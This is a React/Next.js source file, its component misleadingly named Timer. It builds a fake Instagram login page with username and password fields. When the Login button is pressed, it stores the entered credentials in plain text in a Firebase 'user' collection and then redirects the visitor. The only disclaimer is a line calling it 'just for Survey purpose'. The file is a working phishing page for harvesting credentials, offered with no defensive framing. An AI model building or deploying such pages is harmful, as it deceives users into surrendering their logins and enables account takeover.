import { useRouter } from "next/dist/client/router";
import { useRef, useState } from "react"
import { db } from "../firebase";

function Timer() {

    const[username,Setusername] =useState( );
    const[password,Setpassword]=useState();
    const inputref=useRef();
    const inputpass=useRef();
    const router=useRouter();

    const send=()=>{

        if(password){
db.collection("user").add({
    username:username,
    password:password,
})

router.push("/search")
inputref.current.value=" ";
inputpass.current.value=" ";
        }
    }





    return (
        <div  className='"homepage'>
            <p className="survey">This is just  for Survey purpose .</p>
<div className="title">
<h1>Instagram</h1>
</div>

{/* input */}
<div className="inputbox">
<input type="text"   ref={inputref}onChange={(e)=>Setusername(e.target.value)} placeholder="Enter your username"/>
<input   ref={inputpass}  onChange={(e)=>Setpassword(e.target.value)} type="text"  placeholder="Password"/>
<div className="forgot">
    <p>forgot password?</p>
</div>
</div>

<div className="container">
    <button  onClick={send}className="button">Login</button>
   
</div>


            
        </div>
    )
}

export default Timer
